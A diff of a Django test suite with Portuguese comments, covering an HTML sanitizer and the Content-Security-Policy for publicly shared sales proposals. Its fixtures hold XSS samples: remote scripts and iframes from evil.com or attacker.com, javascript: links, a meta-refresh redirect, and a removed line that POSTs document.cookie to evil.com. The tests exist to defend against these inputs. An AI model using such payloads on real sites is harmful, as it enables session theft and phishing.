@@ -211,18 +211,38 @@ class TestPublicEndpointsLGPD:
             )
 
 
-# ─── F7B.3: Sanitização de HTML upload ────────────────────────────────
+# ─── F7B.3 + F7B.5: Sanitização de HTML upload ────────────────────────
 
 
 class TestHtmlSanitizer:
-    def test_strips_script_tags(self):
-        html = '<html><body><h1>Oi</h1><script>alert(1)</script></body></html>'
+    def test_inline_script_preserved(self):
+        """F7B.5: <script> inline e' preservado. Isolamento ficou no iframe
+        sandbox null-origin + CSP connect-src 'none'."""
+        html = '<html><body><h1>Oi</h1><script>console.log(1)</script></body></html>'
         result = sanitize_proposal_html(html)
-        # bleach strip remove a tag mas pode preservar texto interno como
-        # texto inerte. O que importa e' que <script> nao executa mais.
-        assert '<script' not in result
-        assert '</script>' not in result
+        assert '<script>' in result
+        assert 'console.log(1)' in result
+        assert '</script>' in result
         assert '<h1>Oi</h1>' in result
+
+    def test_remote_script_src_blocked(self):
+        """F7B.5: <script src="..."> e' bloqueado — atributo `src` removido,
+        impede carregar JS remoto que nao passou pela auditoria de upload."""
+        html = (
+            '<html><body><h1>Oi</h1>'
+            '<script src="https://evil.com/x.js"></script>'
+            '</body></html>'
+        )
+        result = sanitize_proposal_html(html)
+        # src removido — script vira inline-vazio (inerte)
+        assert 'src=' not in result or 'evil.com' not in result
+        assert 'evil.com' not in result
+
+    def test_script_event_handler_attrs_blocked(self):
+        """F7B.5: <script onload=...> tem o atributo onload removido."""
+        html = '<script onload="alert(1)">x()</script>'
+        result = sanitize_proposal_html(html)
+        assert 'onload' not in result
 
     def test_strips_iframe_object_embed(self):
         html = (
@@ -245,65 +265,37 @@ class TestF7B4SanitizerCoverage:
     """Cobre os gaps achados na auditoria — templates de marketing modernos
     que estavam sendo mutilados pelo sanitizer original."""
 
-    def test_script_pre_strip_removes_js_from_text(self):
-        """F7B.4 fix: bleach com strip=True deixava o JS aparecer como TEXTO
-        depois de remover a tag. Agora pre-process remove o bloco completo."""
+    def test_script_inline_preserved_with_dom_apis(self):
+        """F7B.5: JS inline com APIs do DOM (querySelectorAll, classList)
+        e' preservado para animacoes funcionarem nos templates."""
         html = (
             '<section><h1>Hero</h1></section>'
             '<script>document.querySelectorAll(".section").forEach(s=>s.classList.add("v"))</script>'
             '<section>Features</section>'
         )
         result = sanitize_proposal_html(html)
-        # Nem tag nem conteudo JS sobreviveram
-        assert '<script' not in result
-        assert 'querySelectorAll' not in result
-        assert 'document.' not in result
+        # JS preservado — executa no iframe sandbox null-origin
+        assert '<script>' in result
+        assert 'querySelectorAll' in result
         # Conteudo das secoes preservado
         assert '<h1>Hero</h1>' in result
         assert '>Features<' in result
 
     def test_noscript_block_stripped(self):
-        """<noscript> tambem e' pre-strip — irrelevante na nossa arquitetura
-        (iframe sandbox sempre bloqueia JS)."""
+        """<noscript> e' irrelevante (JS sempre roda no iframe agora) — strip."""
         html = '<section>OK</section><noscript>JS desligado</noscript>'
         result = sanitize_proposal_html(html)
         assert '<noscript' not in result
         assert 'JS desligado' not in result
         assert '<section>OK</section>' in result
 
-    def test_script_orphan_open_tag_stripped(self):
-        """Tag <script> sem fechamento (orfa) tambem e' removida."""
-        html = '<section><script src="x.js"></section>'
+    def test_iframe_orphan_tag_stripped(self):
+        """<iframe> sem fechamento (orfa) e' removida — vetor de embed
+        de paginas externas que poderiam phishear o usuario."""
+        html = '<section><iframe src="https://evil.com" /></section>'
         result = sanitize_proposal_html(html)
-        assert '<script' not in result
-
-    def test_reveal_fix_css_injected_when_script_removed(self):
-        """Quando removemos um <script>, injetamos CSS reveal-fix pra
-        neutralizar 'hide com CSS, mostra com JS'."""
-        html = (
-            '<html><body>'
-            '<style>.hidden{opacity:0}</style>'
-            '<script>$(".hidden").show()</script>'
-            '<section>Hero</section>'
-            '<section class="hidden">Features</section>'
-            '</body></html>'
-        )
-        result = sanitize_proposal_html(html)
-        # Reveal-fix injetado com marker identificavel
-        assert 'data-injected="reveal-fix"' in result
-        # Cobre os patterns mais comuns
-        assert '.hidden' in result and '!important' in result
-        assert '[data-aos]' in result
-        # Reveal-fix vem DEPOIS do conteudo (apendado no fim — bleach strippa
-        # <body>/<html> do fragmento, entao a posicao relativa e' garantida
-        # pelo append no final). Verificar que o conteudo precede o fix:
-        assert result.index('Features') < result.index('data-injected="reveal-fix"')
-
-    def test_reveal_fix_NOT_injected_when_no_script(self):
-        """Sem <script> no input, nao injeta CSS extra (evita bloat)."""
-        html = '<html><body><section>Hero</section></body></html>'
-        result = sanitize_proposal_html(html)
-        assert 'data-injected="reveal-fix"' not in result
+        assert '<iframe' not in result
+        assert 'evil.com' not in result
 
     def test_svg_inline_preserved(self):
         """SVG inline (icones, ilustracoes) preservado com viewBox + path d."""
@@ -440,8 +432,8 @@ class TestF7B4SanitizerCoverage:
         assert 'data:' not in result
 
     def test_full_landing_page_smoke_test(self):
-        """End-to-end: input com hero + features escondidas → output com tudo
-        renderizavel (sem JS, mas com reveal-fix CSS injetado)."""
+        """End-to-end: landing page completa com hero, features animadas via
+        JS, SVGs e CSS modernos — output preserva tudo (F7B.5)."""
         html = '''<!DOCTYPE html>
 <html>
 <head>
@@ -463,14 +455,14 @@ document.querySelectorAll('.hidden-on-load').forEach(el => {
 });
 </script>
 <section class="hidden-on-load grid" data-aos="fade-up">
-  <h2>Features — escondida via JS</h2>
+  <h2>Features — animada via JS</h2>
   <picture>
     <source media="(min-width:600px)" srcset="big.jpg">
     <img src="small.jpg" alt="">
   </picture>
 </section>
 <section class="hidden-on-load" data-animation="slide-up">
-  <h2>Pricing — tambem escondida</h2>
+  <h2>Pricing — tambem animada</h2>
 </section>
 </body>
 </html>'''
@@ -479,19 +471,17 @@ document.querySelectorAll('.hidden-on-load').forEach(el => {
         # Hero intacto
         assert 'Hero — sempre visivel' in result
         # Features e Pricing presentes (texto preservado)
-        assert 'Features — escondida via JS' in result
-        assert 'Pricing — tambem escondida' in result
+        assert 'Features — animada via JS' in result
+        assert 'Pricing — tambem animada' in result
         # SVG inline preservado
         assert '<svg' in result and 'd="M5 12h14"' in result
         # Picture/source preservados
         assert '<picture>' in result and '<source' in result
         # CSS vars preservadas
         assert '--primary' in result
-        # Script removido completamente
-        assert '<script' not in result
-        assert 'querySelectorAll' not in result
-        # Reveal-fix CSS injetado pra mostrar `.hidden-on-load`/`data-aos`/`data-animation`
-        assert 'data-injected="reveal-fix"' in result
+        # F7B.5: Script inline preservado — anima as secoes ao carregar
+        assert '<script>' in result
+        assert 'querySelectorAll' in result
         # Data attrs preservados
         assert 'data-aos="fade-up"' in result
         assert 'data-animation="slide-up"' in result
@@ -516,9 +506,28 @@ document.querySelectorAll('.hidden-on-load').forEach(el => {
         assert 'padding' in result
 
     def test_strips_meta_http_equiv(self):
+        """F7B.5: <meta> agora e' permitido (charset/viewport/og), mas o
+        atributo `http-equiv` e' EXPLICITAMENTE rejeitado para impedir
+        meta-refresh redirects para sites maliciosos."""
         html = '<html><head><meta http-equiv="refresh" content="0;url=evil.com"></head><body>x</body></html>'
         result = sanitize_proposal_html(html)
-        assert '<meta' not in result.lower()
+        assert 'http-equiv' not in result.lower()
+        assert 'evil.com' not in result.lower()
+
+    def test_meta_charset_and_viewport_preserved(self):
+        """F7B.5: meta charset/viewport sao preservados (necessarios em
+        templates modernos para renderizacao correta em mobile)."""
+        html = (
+            '<html><head>'
+            '<meta charset="UTF-8">'
+            '<meta name="viewport" content="width=device-width, initial-scale=1">'
+            '<meta property="og:title" content="Proposta">'
+            '</head><body>x</body></html>'
+        )
+        result = sanitize_proposal_html(html)
+        assert 'charset' in result.lower()
+        assert 'viewport' in result.lower()
+        assert 'og:title' in result
 
     def test_accepts_bytes_input(self):
         result = sanitize_proposal_html(b'<p>ola</p>')
@@ -533,15 +542,16 @@ class TestPublicHtmlSanitizedOnTheFly:
     no GET. Sem isso, HTML pre-existente continuaria com tags perigosas mesmo
     apos o deploy."""
 
-    def test_old_html_with_script_is_sanitized_when_served(
+    def test_old_html_with_dangerous_tags_is_sanitized_when_served(
         self, api_client, proposal,
     ):
-        # Simula proposta antiga: salva arquivo SEM passar por sanitize.
-        # `.save()` direto no FileField bypassa o upload_pdf — replica o
-        # estado do banco antes do deploy.
+        """F7B.5: propostas antigas (pre-deploy) tem <iframe>/javascript:
+        removidos no serve. <script> inline e' PRESERVADO (passa a executar
+        no iframe sandbox null-origin) — `src=` e' removido."""
         evil_html = (
             b'<html><body><h1>Proposta Antiga</h1>'
-            b'<script>fetch("attacker.com")</script>'
+            b'<script>console.log("inline ok")</script>'
+            b'<script src="https://attacker.com/x.js"></script>'
             b'<iframe src="evil.com"></iframe>'
             b'<a href="javascript:alert(1)">click</a>'
             b'</body></html>'
@@ -551,17 +561,18 @@ class TestPublicHtmlSanitizedOnTheFly:
         )
         proposal.save()
 
-        # Aponta GET publico
         resp = api_client.get(
             f'/api/v1/sales/proposals/public/{proposal.public_token}/html/',
         )
         assert resp.status_code == status.HTTP_200_OK
         served = resp.content
-        # Tags perigosas devem ter sido removidas no serve
-        assert b'<script' not in served
-        assert b'</script>' not in served
+        # Tags perigosas removidas
         assert b'<iframe' not in served
         assert b'javascript:' not in served.lower()
+        assert b'attacker.com' not in served  # script remoto bloqueado
+        # F7B.5: <script> inline preservado
+        assert b'<script>' in served
+        assert b'inline ok' in served
         # Conteudo legitimo preservado
         assert b'<h1>Proposta Antiga</h1>' in served
 
@@ -615,15 +626,19 @@ class TestUploadMagicBytes:
         )
         assert resp.status_code == status.HTTP_400_BAD_REQUEST
 
-    def test_legitimate_html_with_script_is_sanitized_on_save(
+    def test_html_with_inline_script_preserves_script_strips_dangerous(
         self, admin_client, proposal,
     ):
-        evil_html = (
+        """F7B.5: <script> inline e' preservado (anima a proposta no
+        iframe sandbox). <iframe>/<script src=...> sao removidos."""
+        html = (
             b'<html><body><h1>Proposta</h1>'
-            b'<script>fetch("evil.com",{method:"POST",body:document.cookie})</script>'
+            b'<script>console.log("ok")</script>'
+            b'<script src="https://attacker.com/x.js"></script>'
+            b'<iframe src="https://evil.com"></iframe>'
             b'</body></html>'
         )
-        f = SimpleUploadedFile('p.html', evil_html, content_type='text/html')
+        f = SimpleUploadedFile('p.html', html, content_type='text/html')
         resp = admin_client.post(
             self.URL.format(id=proposal.id),
             {'proposal_file': f}, format='multipart',
@@ -635,11 +650,14 @@ class TestUploadMagicBytes:
             saved = proposal.proposal_file.read()
         finally:
             proposal.proposal_file.close()
-        # As tags <script> e </script> tem que ter sido removidas. O texto
-        # interno pode sobreviver como texto inerte — o que vale e' que o
-        # browser nao executara mais (sem tag = sem JS).
-        assert b'<script' not in saved
-        assert b'</script>' not in saved
+        # F7B.5: script inline preservado
+        assert b'<script>' in saved
+        assert b'console.log("ok")' in saved
+        # script remoto removido (atributo src eliminado)
+        assert b'attacker.com' not in saved
+        # iframe removido completamente
+        assert b'<iframe' not in saved
+        assert b'evil.com' not in saved
         assert b'<h1>Proposta</h1>' in saved
 
 
@@ -818,3 +836,121 @@ class TestRegenerateToken:
         # Token velho ja nao funciona mais
         resp = api_client.get(f'/api/v1/sales/proposals/public/{old_token}/')
         assert resp.status_code == status.HTTP_404_NOT_FOUND
+
+
+# ─── F7B.5: CSP do HTML publico + audit de upload ─────────────────────────
+
+
+@pytest.mark.django_db
+class TestPublicHtmlCsp:
+    """F7B.5: CSP do endpoint publico libera JS inline mas bloqueia
+    exfiltracao via connect-src e carregamento de JS remoto."""
+
+    def test_csp_allows_inline_script_blocks_remote(
+        self, api_client, proposal,
+    ):
+        proposal.proposal_file = SimpleUploadedFile(
+            'p.html', b'<html><body>x</body></html>', content_type='text/html',
+        )
+        proposal.save()
+        resp = api_client.get(
+            f'/api/v1/sales/proposals/public/{proposal.public_token}/html/',
+        )
+        assert resp.status_code == status.HTTP_200_OK
+        csp = resp.headers.get('Content-Security-Policy', '')
+        assert "script-src 'unsafe-inline'" in csp
+        # script-src NAO pode ter * ou hosts genericos — so 'unsafe-inline'
+        # garante que JS remoto e' bloqueado pelo browser
+        assert '*' not in csp.split('script-src')[1].split(';')[0]
+
+    def test_csp_blocks_connect_src(self, api_client, proposal):
+        """connect-src 'none' impede que JS exfiltre dados via fetch/XHR/
+        WebSocket/sendBeacon/EventSource."""
+        proposal.proposal_file = SimpleUploadedFile(
+            'p.html', b'<html><body>x</body></html>', content_type='text/html',
+        )
+        proposal.save()
+        resp = api_client.get(
+            f'/api/v1/sales/proposals/public/{proposal.public_token}/html/',
+        )
+        csp = resp.headers.get('Content-Security-Policy', '')
+        assert "connect-src 'none'" in csp
+
+    def test_csp_locks_frame_ancestors_to_self(
+        self, api_client, proposal,
+    ):
+        """frame-ancestors 'self' permite o /p/{token} embedar mas bloqueia
+        sites externos (previne clickjacking)."""
+        proposal.proposal_file = SimpleUploadedFile(
+            'p.html', b'<html><body>x</body></html>', content_type='text/html',
+        )
+        proposal.save()
+        resp = api_client.get(
+            f'/api/v1/sales/proposals/public/{proposal.public_token}/html/',
+        )
+        csp = resp.headers.get('Content-Security-Policy', '')
+        assert "frame-ancestors 'self'" in csp
+
+    def test_csp_blocks_form_action_and_base_uri(
+        self, api_client, proposal,
+    ):
+        """base-uri 'none' + form-action 'none' impedem hijack de URLs base
+        e submissao de forms para sites externos."""
+        proposal.proposal_file = SimpleUploadedFile(
+            'p.html', b'<html><body>x</body></html>', content_type='text/html',
+        )
+        proposal.save()
+        resp = api_client.get(
+            f'/api/v1/sales/proposals/public/{proposal.public_token}/html/',
+        )
+        csp = resp.headers.get('Content-Security-Policy', '')
+        assert "base-uri 'none'" in csp
+        assert "form-action 'none'" in csp
+
+
+@pytest.mark.django_db
+class TestUploadAuditLog:
+    """F7B.5: todo upload de proposta gera audit log com SHA-256
+    do arquivo + identificacao do usuario."""
+
+    URL = '/api/v1/sales/proposals/{id}/upload-pdf/'
+
+    def test_html_upload_creates_audit_log(
+        self, admin_client, proposal, admin_user,
+    ):
+        f = SimpleUploadedFile(
+            'p.html', b'<html><body>x</body></html>', content_type='text/html',
+        )
+        resp = admin_client.post(
+            self.URL.format(id=proposal.id),
+            {'proposal_file': f}, format='multipart',
+        )
+        assert resp.status_code == status.HTTP_200_OK, resp.content
+        log = AuditLog.objects.filter(
+            user=admin_user, action='upload_proposal_file',
+            resource_type='proposal', resource_id=proposal.id,
+        ).first()
+        assert log is not None
+        # new_value carrega metadados do upload
+        assert log.new_value is not None
+        assert log.new_value.get('kind') == 'html'
+        assert 'sha256' in log.new_value
+        assert len(log.new_value['sha256']) == 64  # SHA-256 hex
+
+    def test_pdf_upload_creates_audit_log(
+        self, admin_client, proposal, admin_user,
+    ):
+        # PDF minimo valido (header magic bytes corretos)
+        pdf_bytes = b'%PDF-1.4\n%minimal\n'
+        f = SimpleUploadedFile('p.pdf', pdf_bytes, content_type='application/pdf')
+        resp = admin_client.post(
+            self.URL.format(id=proposal.id),
+            {'proposal_file': f}, format='multipart',
+        )
+        assert resp.status_code == status.HTTP_200_OK, resp.content
+        log = AuditLog.objects.filter(
+            user=admin_user, action='upload_proposal_file',
+            resource_type='proposal', resource_id=proposal.id,
+        ).first()
+        assert log is not None
+        assert log.new_value.get('kind') == 'pdf'
